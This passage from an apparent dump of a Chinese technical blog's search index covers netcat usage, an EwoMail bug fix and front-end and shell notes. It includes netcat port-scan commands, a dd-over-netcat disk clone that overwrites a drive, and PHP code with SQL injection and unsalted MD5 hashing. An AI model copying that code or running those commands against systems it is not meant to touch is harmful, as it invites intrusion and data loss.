pointer: 4, 8, 12, …\n-h 帮助信息\n-i secs 延时的间隔\n-l 监听模式，用于入站连接\n-n 指定数字的IP地址，不能用hostname\n-o file 记录16进制的传输\n-p port 本地端口号\n-r 任意指定本地及远程端口\n-s addr 本地源地址\n-u UDP模式\n-v 详细输出——用两个-v可得到更详细的内容\n-w secs timeout的时间\n-z 将输入输出关掉——用于扫描时，其中端口号可以指定一个或者用lo-hi式的指定范围。\n\n参　　数：\n-l   使用监听模式，管控传入的资料。\n-v   显示指令执行过程。\n-n   直接使用IP地址，而不通过域名服务器。\n-u   使用UDP传输协议。\n-r   乱数指定本地与远端主机的通信端口。\n-z   使用0输入/输出模式，只在扫描通信端口时使用。\n\n-G指向器数目   设置来源路由指向器，其数值为4的倍数。\n-g网关   设置路由器跃程通信网关，最丢哦可设置8个。\n-o输出文件   指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。\n-s来源位址   设置本地主机送出数据包的IP地址。\n-p通信端口   设置本地主机使用的通信端口。\n-i延迟秒数   设置时间间隔，以便传送信息及扫描通信端口。\n-w超时秒数   设置等待连线的时间。\n\n简单用法举例\n在端口1234建立连接，互相发送输入\nnc -l 1234\nnc 127.0.0.1 1234\n\nnc -p 1234 -w 5 host.example.com 80\n建立从本地1234端口到host.example.com的80端口连接，5秒超时\nnc -u host.example.com 53\nu为UDP连接\n\necho -n “GET / HTTP/1.0″r”n”r”n” | nc host.example.com 80\n连接到主机并执行\n\nnc -v -z host.example.com 70-80\n扫描端口(70到80)，可指定范围。-v输出详细信息。\n\n1）端口扫描\nnc -v -w 2 192.168.2.34 -z 21-24\nnc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused\nConnection to 192.168.2.34 22 port [tcp/ssh] succeeded!\nnc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refused\nnc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused\n\n2) 传输文件\n  nc -l 1234   test.txt\n  nc 192.168.2.34 \u003c test.txt\n\n  cat rpyc.py |nc -l 1234\n  nc 10.246.46.15  1234   rpyc.py \n\n3)简单聊天工具\n在192.168.2.34上： nc -l 1234\n在192.168.2.33上： nc 192.168.2.34 1234\n这样，双方就可以相互交流了。使用ctrl+C(或D）退出。\n\n3.用nc命令操作memcached\n1）存储数据：printf “set key 0 10 6rnresultrn” |nc 192.168.2.34 11211\n2）获取数据：printf “get keyrn” |nc 192.168.2.34 11211\n3）删除数据：printf “delete keyrn” |nc 192.168.2.34 11211\n4）查看状态：printf “statsrn” |nc 192.168.2.34 11211\n5）模拟top命令查看状态：watch “echo stats” |nc 192.168.2.34 11211\n6）清空缓存：printf “flushallrn” |nc 192.168.2.34 11211 (小心操作，清空了缓存就没了）\n\n扩展资料二:命令linux nc 命令传输文件\n\nnc到底干嘛用的我不多描述，今天主要讲下用nc传输文件。由于公司的设备sudo后没有ssh，scp等远程接入命令，或host.deny里面设置了 ssh的deny，不管怎样的原因。我今天跨过大家常用的scp,来说明下一个更有用的轻量级工具，nc的另一个强大的功—文件传输。\n\n范例如下：\n\n目的主机监听\nnc -l 监听端口    要接收的文件名\nnc -l 4444   cache.tar.gz\n\n源主机发起请求\nnc  目的主机ip    目的端口\nnc  192.168.0.85  4444\n\nserver1: 192.168.228.221\nserver2: 192.168.228.222\n二、常见使用\n1、远程拷贝文件\nremote: nc -lp 1234   install.log\nlocal:  nc -w 1 192.168.228.222 1234 \u003c install.log\n\n2、克隆硬盘或分区\n操作与上面的拷贝是雷同的，只需要由dd获得硬盘或分区的数据，然后传输即可。\n克隆硬盘或分区的操作，不应在已经mount的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用Knoppix工 具光盘）启动系统后，在server2上进行类似的监听动作：\n nc -l -p 1234 | dd of=/dev/sda\nserver1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：\ndd if=/dev/sda | nc 192.168.228.222 1234\n\n3、端口扫描\n nc -v -w 1 192.168.228.222 -z 1-1000\nhatest2 [192.168.228.222] 22 (ssh) open\n\n4、保存Web页面\nwhile true; do nc -l -p 80 -q 1 \u003c somepage.html; done\n\n5、模拟HTTP Headers\n\n[root@hatest1 ~] nc www.linuxso.com 80\nGET / HTTP/1.1\nHost: ispconfig.org\nReferrer: mypage.com\nUser-Agent: my-browser\n在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP Headers内容。\n\nHTTP/1.1 200 OK\nDate: Tue, 16 Dec 2008 07:23:24 GMT\nServer: Apache/2.2.6 (Unix) DAV/2 modmono/1.2.1 modpython/3.2.8 Python/2.4.3 modperl/2.0.2 Perl/v5.8.8\nSet-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/\nExpires: 0\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nCache-Control: private, post-check=0, pre-check=0, max-age=0\nSet-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/\nVary: Accept-Encoding\nTransfer-Encoding: chunked\nContent-Type: text/html\n[......]\n\n6、聊天\nnc还可以作为简单的字符下聊天工具使用，同样的，server2上需要启动监听：\nnc -lp 1234\n\nserver1上传输：\n nc 192.168.228.222 1234\n\n7、传输目录\n从server1拷贝nginx-0.6.34目录内容到server2上。需要先在server2上，用nc激活监听，server2上运行：\nnc -l 1234 |tar xzvf -\ntar czvf – nginx-0.6.34|nc 192.168.228.222 1234\n\n8、参数简介\n这仅是一个1.10版本的简单说明，详细的参数使用还是需要看man：\n引用","tags":null},{"location":"//blog.pytool.com/Other/2017-07-11 ewomail bug修复","title":"EwoMail修改密码后无法登陆bug修复","text":"EwoMail修改密码后无法登陆bug修复\n\n现象:\n  新用户登陆后修改密码后 新密码旧密码都无法登陆\n\n排查 ：\n登陆数据库 查看密码\nselect id,password from ewomail.iusers \\G;\n************************ 11. row *********************\n      id: 12\npassword: d41d8cd98f00b204e9800998ecf8427e\n********************* 12. row *********************\n      id: 13\npassword: d41d8cd98f00b204e9800998ecf8427e\n********************* 13. row *********************\n      id: 14\npassword: d41d8cd98f00b204e9800998ecf8427e\n\n MD5解密d41d8cd98f00b204e9800998ecf8427e发现是个空密码\n\n     查询结果：  \n     [空密码]/[Empty String]\n\n 前端调试 ajax postform传值 Status Code:200 OK\n   PrevPassword=lsl123457\u0026NewPassword=lshl123457\u0026Action=ChangePassword\u0026XToken=6b43065d8ab5c2ba300337907c7d21fb\n   所以问题出在后端程序处理\n\n 后端定位密码修改\n app/libraries/RainLoop/EwoMail.php\n  public function updatePassword($email,$password,$newpassowrd)\n    {\n        $newData = [\n            'email'=  $email,\n            'password'=  $password,\n            'newpassowrd'=  $newpassowrd\n        ];\n        $r = $this-  send('User/updatepassword',$newData);\n        return $r;\n    }\n  \n继续跟踪 ewomail-admin/module/Api/User.php\n\n/\n 修改账号密码\n /\nRout::get('updatepassword',function(){\n    $email = iany('email');\n    $password = iany('password');\n    $newpassword = iany('newpassword');\n    if(!$email){\n        E::error('email domain parameter');\n    }\n    if(!$password){\n        E::error('password domain parameter');\n    }\n    if(!$password){\n        E::error('newpassword domain parameter');\n    }\n    $row = App::$db-  getOne(\"select * from \".table(\"users\").\" where email='$email' and active=1\");\n    if(!$row){\n        E::error('Data does not exist');\n    }\n    if($row['password']!=md5($password)){\n        E::error('The original password is not correct');\n    }\n    $newData = [\n        'password'=  md5($newpassword)\n    ];\n    App::$db-  update(\"users\",$newData,\"email='$email'\");\n    E::success('');\n});\n发现 newpassowrd 笔误，改正\npublic function updatePassword($email,$password,$newpassword)\n   {\n       $newData = [\n           'email'=  $email,\n           'password'=  $password,\n           'newpassword'=  $newpassword\n       ];\n       $r = $this-  send('User/update_password',$newData);\n       return $r;\n   }\n\n问题修复。\n\n总结：问题虽然不大，但是查起来确实麻烦","tags":null},{"location":"//blog.pytool.com/tool/2016-01-01 Chrome扩展插件","title":"Chrome扩展插件","text":"划词翻译\n\nJSONView\n\nJSONView 是一个方便查看 Json 结构的插件，展开，折叠，看接口返回数据就是这么方便。\n直达链接\nSnappySnippet\n\n有时候想在 Codepen, JS Bin, jsFiddle 等平台演示 bug 或者装个五毛的 B ,但限于样式拆分得太细，难以抽离，SnappySnippet 可以快速帮你完成这项苦差事。\n直达链接\nEditThisCookie\n\nEditThisCookie 是个修改 Cookie 的快捷工具。\n直达链接\nValidity\n\nValidity 可以用来快速验证你的 HTMl 文档明显错误，比如少了个结束标签，使用了不规范标签，缺少了某些属性等等。\n直达链接\nResponsive Web Design Tester\n\n移动端页面适配利器，使用 Responsive Web Design Tester，你可以快速在目标尺寸上打开页面，可以自己配置尺寸，修改 UserAgent, 整体效果比 Chrome 自带模拟器更赞~\n直达链接\nAllow-Control-Allow-Origin: \n\nJS 同源策略保障我们的页面安全，但是开发期间我们并不想看到这烦人的家伙，使用 Allow-Control-Allow-Origin:  插件轻松解决这个问题 Allow-Control-Allow-Origin:  。\n直达链接\nChrome Sniffer Plus\n\n有时候打开某家公司的页面，很好奇人家用了哪些技术库、框架，Chrome Sniffer Plus 可以为你服务。\n直达链接\nClear Cache\n\n快速清除页面缓存？我用 Clear Cache。\n直达链接\nFull Page Screen Capture\n\n看到酷炫的页面排版，叹为观止的巧妙设计想保存下来？ 使用 Full Page Screen Capture。\n直达链接\nLastPass\n\n管理页面密码，省去频繁输入测试账号密码的烦恼，为了安全保障，最好还是不要保存购物网站的密码哟~\n直达链接\nPanda 5 | News \u0026 Inspiration Dashboard\n\nPanda 的定位是一个非常优秀的资源阅读器。\n直达链接\nOctotree\n\n上同性社交网站的时候经常在翻别人源码的时候特别苦恼，特别是你的网络不给力的时候，简直想死，Octotree 帮助你整理出来项目文件列表。\n直达链接\nPerfectPixel\n\n这是一个像素级对稿的插件，如果你所在的公司也特别有情怀的话，那么这个软件可以省去大把你和设计师对稿的时间。\n直达链接\nPostman\n\n口碑极好的一个接口调试工具，必备神器，不多说，但是你一定要装。\n直达链接\nAngularJS Batarang / React Developer Tools / Vue.js devtools\n\nAngular / React / Vue 调试工具。\n\nAngularJS Batarang\n\nReact Developer Tools\nVue.js devtools\n\n上面的插件大部分都没有中文版，而且 Chrome 本来也在墙外，如果你发现自己打不开上面那些链接的话，趁这个机会出个墙吧。\nStylish\n\nStylish 是一个自定义页面外观的工具，比如想去掉 度 无下限的广告，给它加个 display: none ！\n直达链接\nUser-Agent Switcher for Chrome\n\n切换 User Agent 的插件。\n直达链接\nWeb Server for Chrome\n\n快速启动小项目或Demo的神器。\n直达链接\n一键管理所有扩展\n\n插件装多了，不好管理？ 启动慢？ 好好管教管教。\n直达链接\n广告终结者\n\n跟烦人的广告说再见，还你一个干净有情怀的页面。\n直达链接\n页面自动刷新\n\n定时刷新页面，我还记得当初用它抢到一个 小米2s。","tags":null},{"location":"//blog.pytool.com/Reship/2014-05-08-CLNDR.js-doc","title":"CLNDR.js中文文档","text":"CLNDR 是一个jQuery日历插件。由于缺少真正动态的前端日历插件，无奈之下，创作了CLNDR。\n\n查看demo: kylestetz.github.io/CLNDR/\n\n 下载\n 依赖\n    使用Bower\n    结合Angular使用\n 引言：标签由你来定\n    days 数组\n    传入你的事件\n 使用\n    多天事件\n    限制和Datepickers\n    返回实例/API\n    Template Requirements\n 配置\n    模板渲染引擎\n    国际化\n    Underscore 模板定界符\n    IE 兼容问题\n\n下载\n\n 开发环境 ~ clndr.js\n 生产环境 ~ clndr.min.js\n\n依赖\nCLNDR依赖jQuery和Moment.js。默认情况下，CLNDR尝试使用Underscore 的.template()函数，不过，如果你指定了自定义的渲染函数（下文有介绍），Underscore就不必要了。\n\n因为和Underscore的API一致，Lo-Dash的.template()函数也能正常工作。可以用Lo-Dash代替underscore。\n\n使用Bower\n你可以通过Bower安装CLNDR：\n\n    bower install clndr\n\n默认情况下没有安装Underscore。这允许你使用任何想用的渲染引擎。如果你想通过underscore使用默认的模板选项，安装underscore即可\n\n    bower install underscore\n    \n结合Angular使用\n如果你想把CLNDR集成到一个使用Angular的站点，通过指令angular-clndr开始.\n\n引言：标签由你来定\n有很多美妙的并且功能强大的日历模块，它们有个相同的问题就是：它们给你定义了标签（和一堆js）,你不得不work with and style。这导致了很多的hacking, pushing, pulling,和烦人的‘为什们我不能做我想要的’场景\n\nCLNDR不产生标签（好吧，它是有一些默认标签，但这不是一码事）。相反，CLNDR要求你创建template，它会给你的模板提供一系列对象，只需几行代码，这些对象就可以让你做出你想要的。\n\ndays 数组\n下面是一个典型的CLNDR模板。由控制部分和网格部分组成。\n\n    div class=\"clndr-controls\"\n      div class=\"clndr-previous-button\"\u0026lsaquo;/div\n      div class=\"month\"%= month %/div\n      div class=\"clndr-next-button\"\u0026rsaquo;/div\n    /div\n    div class=\"clndr-grid\"\n      div class=\"days-of-the-week\"\n        % .each(daysOfTheWeek, function(day) { %\n          div class=\"header-day\"%= day %/div\n        % }); %\n        div class=\"days\"\n          % .each(days, function(day) { %\n            div class=\"\u003c%= day.classes %\"  %= day.day %/div\n          % }); %\n        /div\n      /div\n    /div\n    \n\ndays 数组包含着做一个日历所需的绝大部分信息，它的结构大致如下：\n\n    {\n      day: 5,\n      classes: \"day\",\n      events: [],\n      date: moment(\"2013-05-29\")\n    }\n    \n通过它可以快速的创建出日历网格。days.classes会根据不同的情形包含额外的类名：如果某个日期是今天，则会包含today类。event类也是同样，如果某天带有事件，则会包含event类\n\n传入你的事件\nCLNDR接受对象数组格式的事件：\n\n    events = [\n      { date: \"YYYY-MM-DD or some other ISO Date format\", and: \"anything else\" }\n    ]\n    \nCLNDR会遍历事件数组，查找date属性，除非你指定了，否则它将使用dateParameter选项。在你的模板中，days数组会自动包含这些事件对象。查看demo，看看events如何填充days数组。\n\n使用\nCLNDR依赖underscore.js 和moment.js(除非你使用了另外的渲染引擎，那样的话underscore就不需要了)。确保在head标签里引入clndr.js之前引入这些依赖，当然别忘了jQuery。\n\n最少代码如下（CLNDR包含一个默认的模板）\n\n    $('.parent-element').clndr();\n    \n所有的可配置项：\n\n    $('.parent-element').clndr({\n    \n      // 模板可以保存在script标签里。script type=\"text/template\"/script\n      // 或者以字符串形式引入\n      template: clndrTemplate,\n    \n      // 设置一周的开始，0为周日开始，1为周一开始，默认是周日。\n      weekOffset: 0,\n    \n      // 设置初始的月份，值为日期字符串或者moment对象\n      startWithMonth: \"YYYY-MM-DD\" or moment(),\n    \n      // 设置星期的缩写，如果你设置moment.js为不同的语言，它会自动推断。\n      // 如果因为某些原因，不能正常推断，用它手动设置。 \n      // 这个数组必须以周日开始（结合weekOffset使用可以改变成以周一开始）\n      daysOfTheWeek: ['D', 'L', 'M', 'M', 'J', 'V', 'S'],\n    \n      // CLNDR会寻找目标类名来绑定事件\n      // 下面是默认的：\n      targets: {\n        nextButton: 'clndr-next-button',\n        previousButton: 'clndr-previous-button',\n        nextYearButton: 'clndr-next-year-button',\n        previousYearButton: 'clndr-previous-year-button',\n        todayButton: 'clndr-today-button',\n        day: 'day',\n        empty: 'empty'\n      },\n      // 点击事件的回调函数! 在所有的回调函数中， this 指向clndr实例\n      clickEvents: {\n        // fired whenever a calendar box is clicked.\n        // returns a 'target' object containing the DOM element, any events,\n        // and the date as a moment.js object.\n        click: function(target){ },\n        // 用户点击下个月时触发\n        // 返回一个设置为下个月的moment对象\n        nextMonth: function(month){ },\n        // 用户点击上个月时触发\n        // 返回一个设置为上个月的moment对象\n        previousMonth: function(month){ },\n        // 用户点击明年时触发\n        // 返回一个设置为明年当前月的moment对象\n        nextYear: function(month) { },\n        // 用户点击去年时触发\n        // 返回一个设置为去年当前月的moment对象\n        previousYear: function(month) { },\n        // 点击导致月份发生变化时触发\n        // 返回一个设置为正确月份的moment对象\n        onMonthChange: function(month) { },\n        // fires any time the year changes as a result of a click action.\n        // if onMonthChange is also set, it is fired BEFORE onYearChange.\n        // returns a moment.js object set to the correct month and year.\n        //点击导致年份变化时触发，如果同时设置了onMonthChange，那么它将先于onYearChange触发，返回一个设置为正确年月的moment对象。\n        onYearChange: function(month) { },\n        // fired when a user goes to the current month \u0026 year.\n        // returns a moment.js object set to the correct month.\n        //当用户回到当前年月时触发，返回一个设置为正确月份的moment对象\n        today: function(month){ }\n      },\n    \n      // this is called only once after clndr has been initialized and rendered.\n      // use this to bind custom event handlers that don't need to be re-attached\n      // every time the month changes (most event handlers fall in this category).\n      // hint: this.element refers to the parent element that holds the clndr,\n      // and is a great place to attach handlers that don't get tossed out every\n      // time the clndr is re-rendered.\n      //该方法只会在clndr初始化并且渲染完成后调用一次，用它来绑定自定义事件处理器（适用于那些当月份变化时不用重新绑定的事件处理器，大部分事件处理器都属于这一类），提示：this.element 引用承载clndr的父元素，这是一个绑定事件的好地方，因为它不会再clndr重新渲染时被销毁。\n      ready: function() { },\n      // a callback when the calendar is done rendering.\n      // This is a good place to bind custom event handlers\n      // (also see the 'ready' option above).\n      //当clndr渲染完成时的回调函数。同样是用来绑定自定义事件处理器。\n      doneRendering: function(){ },\n    \n      // 事件对象的数组\n      events: [],\n      // if you're supplying an events array, dateParameter points to the\n      // field in your event object containing a date string.\n      // It's set to 'date' by default.\n      //如果你提供了一个事件数组，dateParameter指向了你事件对象里包含时间的域，默认是date\n      dateParameter: 'date',\n      // show the numbers of days in months adjacent to the current month\n      // (and populate them with their events). defaults to true.\n      // CLNDR can accept events lasting more than one day!\n      // just pass in the multiDayEvents option and specify what the start and\n      // end fields are called within your event objects. See the example file\n      // for a working instance of this.\n      multiDayEvents: {\n        startDate: 'startDate',\n        endDate: 'endDate'\n      },\n    \n      // show the dates of days in months adjacent to the current month.\n      // defaults to true.\n      showAdjacentMonths: true,\n      // when days from adjacent months are clicked, switch the current month.\n      // fires nextMonth/previousMonth/onMonthChange click callbacks. defaults to false.\n      adjacentDaysChangeMonth: false,\n      // always make the calendar six rows tall (42 days) so that every month has a\n      // consistent height. defaults to 'false'.\n      forceSixRows: false,\n    \n      // anything you want access to in your template\n      extras: { }\n    \n      // if you want to use a different templating language, here's your ticket.\n      // Precompile your template (before you call clndr),\n      // pass the data from the render function into your template,\n      // and return the result. The result must be a string containing valid markup.\n      // The keyword 'this' is set to the clndr instance\n      // in case you need access to any other properties.\n      // More under 'Template Rendering Engine' below.\n      render: function(data){\n        return 'div class=\"html data as a string\"/div';\n      },\n    \n      // if you want to prevent the user from navigating the calendar outside\n      // of a certain date range (e.g. if you are making a datepicker), specify\n      // either the startDate, endDate, or both in the constraints option. You\n      // can change these while the calendar is on the page... See documentation\n      // below for more on this!\n      constraints: {\n        startDate: '2017-12-22',\n        endDate: '2018-01-09'\n      }\n    });\n\n在你的模板里，你可以使用的变量如下：\n\n    // day-of-the-week 缩写的数组,\n    // shifted as requested using the weekOffset parameter.\n    daysOfTheWeek: ['S', 'M', 'T', etc...]\n    // the number of 7-block calendar rows,\n    // in the event that you want to do some looping with it\n    numberOfRows: 5\n    // the days object, documented in more detail above\n    days: [ { day, classes, id, events, date } ]\n    // the month name- don't forget that you can do things like\n    // month.substring(0, 1) and month.toLowerCase() in your template\n    month: \"May\"\n    // the year that the calendar is currently focused on\n    year: \"2013\"\n    // all of the events happening this month\n    eventsThisMonth: [ ],\n    // all of the events happening last month\n    eventsLastMonth: [ ],\n    // all of the events happening next month\n    eventsNextMonth: [ ],\n    // anything you passed into the 'extras' property when creating the clndr\n    extras: { }\n\n多日事件\nCLNDR现在可以接受持续多天的时间。你只需告诉它如何得到事件的开始和结束日期。\n\n    var lotsOfEvents = [\n      { start: '2013-11-04', end: '2013-11-08', title: 'Monday to Friday Event' },\n      { start: '2013-11-15', end: '2013-11-20', title: 'Another Long Event' }\n    ];\n    \n    $('calendar').clndr({\n      events: lotsOfEvents,\n      multiDayEvents: {\n        startDate: 'start',\n        endDate: 'end'\n      }\n    });\n\n配置\n模板渲染引擎\n国际化\nClndr对国际化支持的程度与Moment.js是一致的。\nUnderscore模板定界符\n如果你不喜欢% %和%= %风格的定界符，你可以正则表达式的形式给Underscore.js提供替代方案。\ninterpolate：输出字符串(默认是%= %)\nescape：用来escaping html (默认是%- %)\nevaluate：用来执行javascript(默认是% %)\n如果你更习惯Jinja2/Twig/Nunjucks风格的定界符，只需在实例化你的clndr之前先调用下面的代码\n\n    // switch to Jinja2/Twig/Nunjucks-style delimiters\n    _.templateSettings = {\n      interpolate: /\\{\\{(.+?)\\}\\}/g,\n      escape: /\\{\\{\\-(.+?)\\}\\}/g,\n      evaluate: /\\{\\%(.+?)\\%\\}/g\n    };\n\nIE兼容问题\n如果你打算支持IE8或更低，你需要注意版本问题。","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-27-the-eighth-day-talk-about-rotate-and-scale","title":"第八天，谈谈【旋转和翻转】","text":"在切图过程中，经常会碰到一些小图标，比如各种方向的箭头等。这时我们就可以利用旋转和翻转，来减少切图工作量，同时也能减小图片体积。\n\n我们有下面的这个图标，怎么得到其他方向的箭头呢？\n\n旋转\n--\n\nCSS3提供了transform属性，和2D旋转函数rotate()\n\n    transform: rotate(angle);       / an angle, e.g., rotate(30deg) /\n\n其中angle是旋转的角度，如果值为正数，则表示顺时针旋转，若值为负数，则表示逆时针旋转。例如：让元素顺时针旋转30度应该写成transform: rotate(30deg)。当然，由于transform属性还处于试验阶段，所以还需加上浏览器的私有前缀。\n\n如何用上面的图标，得到向右的箭头呢？测试用例一如下：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/3DBE9/1/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n改变旋转的角度，你可以得到任意方向的箭头。\n\n和transform密切相关的属性是transform-origin，它用来设置图形变换的原点。对rotate函数而言就是旋转的中心。在2D变换中，transform-origin的默认值是50% 50%，即以元素的中心作为旋转的圆心。\n\n为了兼容IE6、7、8，需要使用微软特有的filter技术。分为两种情况：\n\n 旋转90度的倍数，使用BasicImage滤镜（简单）\n\n        filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);/旋转90度/\n\n rotation可取值0、1、2、3。默认值是0。当rotation=1时，旋转90度；rotation=2时，旋转180度；rotation=3时，旋转270度。\n\n 旋转任意角度，使用Matrix滤镜（稍复杂）\n\n        filter: progid:DXImageTransform.Microsoft.Matrix(M11=v1,M12=v2,M21=v3,M22=v4,SizingMethod='auto expand');\n\n 不要被这一长串参数吓到，其实很简单。我们只需给 M11、M12、M21、M22 这四个参数赋值即可。参数值怎么算呢？假设要使图形旋转X度，那么参数值分别为 v1=cos(X)、v2=-sin(X)、v3=sin(X)、v4=cos(X)。最后一个参数SizingMethod用来确定元素大小如何变化，可取值为'clip to original'和'auto expand'。'clip to original'表示元素大小不变，对旋转后的图形进行裁切。'auto expand'表示元素自动扩展大小以适应旋转后的图形。\n\n翻转\n--\n同样是使用transform属性，但是CSS3并没有提供翻转函数。需要利用2D缩放函数scale()\n\n    transform: scale(sx[, sy]);  / one or two unitless numbers, e.g., scale(2.1,4) /\n\nsx代表X轴方向上缩放的倍数，sy代表Y轴方向上缩放的倍数，sy可有可无，如果没有的话，默认和sx相等。例如：想让元素长宽都缩小到原来的一半，可以写成transform:scale(0.5)。同样的，在实际应用时要加上浏览器私有前缀。\n\n还可以只针对X轴方向进行缩放\n\n    transform:  scaleX(sx)    / a unitless number, e.g., scaleX(2.7) /\n\n或只针对Y轴方向进行缩放\n\n    transform:  scaleY(sy)    / a unitless number, e.g., scaleY(0.3) /\n\n当sx或sy为负值时，图像就会发生翻转。测试用例二如下：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/3DBE9/3/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\nsx值为-1，图像发生水平翻转。得到的结果与测试用例一旋转180度后一致。但需要注意的是：翻转的结果并不一定和旋转180度的结果总相同。翻转以轴为镜像，旋转180度以点为镜像。体会一下。\n\n同样，为了兼容IE6、7、8，还是使用filter\n\n    filter:FlipH; /Flip Horizontal  水平翻转/\n    filter:FlipV; /Flip vertical 垂直翻转/\n\n总结起来就是:\n\n        /水平翻转/\n        .flipx {\n            -webkit-transform: scaleX(-1);\n            -moz-transform: scaleX(-1);\n            -ms-transform: scaleX(-1);\n            -o-transform: scaleX(-1);\n            transform: scaleX(-1);\n            filter: FlipH();\n        }\n        /垂直翻转/\n        .flipy{\n            -webkit-transform: scaleY(-1);\n            -moz-transform: scaleY(-1);\n            -ms-transform: scaleY(-1);\n            -o-transform: scaleY(-1);\n            transform: scaleY(-1);\n            filter: FlipV();\n        }\n\n了解了旋转和翻转，以后切图的时候试着用一下。\n\n  [1]: http://htmljs.b0.upaiyun.com/uploads/1392273296947-circle-backward-128.png\n","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-10-06 Xpath语法笔记","title":"Xpath语法笔记","text":"摘要: XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中通过元素和属性进行导航。 同时Xpath在做爬虫时也是一款利器\n一、选取节点\n\n常用的路劲表达式：\n表达式\n 描述 \t实例\n\nnodename \t选取nodename节点的所有子节点\n xpath('//div')\n 选取了div节点的所有子节点\n/ \t从根节点选取 \txpath('/div') \t从根节点上选取div节点\n// \t选取所有的当前节点，不考虑他们的位置\n xpath('//div') \t选取所有的div节点\n. \t选取当前节点 \txpath('./div')\n 选取当前节点下的div节点\n.. \t选取当前节点的父节点\n xpath('..') \t回到上一个节点\n@ \t选取属性\n xpath（'//@calss'）\n 选取所有的class属性\n\n二、谓语\n\n谓语被嵌在方括号内，用来查找某个特定的节点或包含某个制定的值的节点\n\n实例：\n表达式\n 结果\nxpath('/body/div[1]')\n 选取body下的第一个div节点\nxpath('/body/div[last()]')\n 选取body下最后一个div节点\nxpath('/body/div[last()-1]') \t选取body下倒数第二个div节点\nxpath('/body/div[positon()\u003c3]') \t选取body下前两个div节点\nxpath('/body/div[@class]') \t选取body下带有class属性的div节点\nxpath('/body/div[@class=\"main\"]') \t选取body下class属性为main的div节点\nxpath('/body/div[price  35.00]') \t选取body下price元素值大于35的div节点\n三、通配符\n\nXpath通过通配符来选取未知的XML元素\n表达式\n 结果\nxpath（'/div/'）\n 选取div下的所有子节点\nxpath('/div[@]')\n 选取所有带属性的div节点\n\n四、取多个路径\n\n使用“|”运算符可以选取多个路径\n\n表达式\n 结果\nxpath('//div|//table')\n 选取所有的div和table节点\n\n五、Xpath轴\n\n轴可以定义相对于当前节点的节点集\n轴名称\n 表达式 \t描述\nancestor\n xpath('./ancestor::') \t选取当前节点的所有先辈节点（父、祖父）\nancestor-or-self \txpath('./ancestor-or-self::') \t选取当前节点的所有先辈节点以及节点本身\nattribute \txpath('./attribute::') \t选取当前节点的所有属性\nchild \txpath('./child::') \t返回当前节点的所有子节点\ndescendant \txpath('./descendant::') \t返回当前节点的所有后代节点（子节点、孙节点）\nfollowing \txpath('./following::') \t选取文档中当前节点结束标签后的所有节点\nfollowing-sibing \txpath('./following-sibing::') \t选取当前节点之后的兄弟节点\nparent \txpath('./parent::') \t选取当前节点的父节点\npreceding \txpath('./preceding::') \t选取文档中当前节点开始标签前的所有节点\n\npreceding-sibling \txpath('./preceding-sibling::') \t选取当前节点之前的兄弟节点\nself \txpath('./self::*') \t选取当前节点\n\n六、功能函数    \n\n使用功能函数能够更好的进行模糊搜索\n\n函数 \t用法 \t解释\nstarts-with \txpath('//div[starts-with(@id,\"ma\")]') \t选取id值以ma开头的div节点\ncontains\n xpath('//div[contains(@id,\"ma\")]') \t选取id值包含ma的div节点\nand\n xpath('//div[contains(@id,\"ma\") and contains(@id,\"in\")]') \t选取id值包含ma和in的div节点\ntext() \txpath('//div[contains(text(),\"ma\")]') \t选取节点文本包含ma的div节点\n\nscrapy xpath文档：http://doc.scrapy.org/en/0.14/topics/selectors.html","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 time","title":"Linux命令 time时间统计","text":"xtime\n/usr/bin/time -f'%Uu %Ss %er %Mkb %C' \"$@\"\n\n用户时间\n系统时间\n实际时间\n最大内存占用","tags":null},{"location":"//blog.pytool.com/tool/2016-01-01 Insomnia","title":"Insomnia","text":"https://insomnia.rest/documentation/\n\nDebug APIs like a human, not a robot\nFinally, a REST client you'll love","tags":null},{"location":"//blog.pytool.com/Post/shell/2017-11-07 shell中的map使用","title":"shell中的map使用","text":"bash 的版本必须   = 4.1.2，升级bash：\n\n declare -A abc\ndeclare: usage: declare [-afFirtx] [-p] [name[=value] ...]\n\nshell中map的定义与使用\n\n declare -A 变量名\t切记使用大写的A，不是小写的a\n\n[root@www ~]# declare -A map=([\"sunjun\"]=\"a\" [\"jason\"]=\"b\" [\"lee\"]=\"c\") #定义时初始化一些值\n[root@www ~]# echo ${map[@]}  \t\t#输出所有values\na c b\n[root@www ~]# echo ${!map[@]}\t\t#输出所有keys\nsunjun lee jason\n\n[root@www ~]# map[\"hello\"]=123\t\t#向map中添加一个key=value\n[root@www ~]# echo ${map[@]}\na c b 123\n[root@www ~]# echo ${!map[@]}\nsunjun lee jason hello\n[root@www ~]#\n\nshell中的数组\n\n[root@www ~] declare -a array=(\"aa\" \"bb\" \"cc\")\t\t#定义一个数组\n[root@www ~]# echo ${array[@]}\t\t#输出所有元素的值\naa bb cc\n[root@www ~]# echo ${!array[@]}\t\t#输出所有元素的索引\n0 1 2\n\n[root@www ~]# array[100]=\"hello\"\t#指定索引添加一个元素\n[root@www ~]# echo ${array[@]}\naa bb cc hello\n[root@www ~]# echo ${!array[@]}\n0 1 2 100\n[root@www ~]#","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang ip2location","title":"Go语言 ip2location","text":"github.com/bububa/ip2region-go\ngithub.com/fiorix/freegeoip\ndocker run --restart=always -p 8080:8080 -d fiorix/freegeoip\n\ncurl 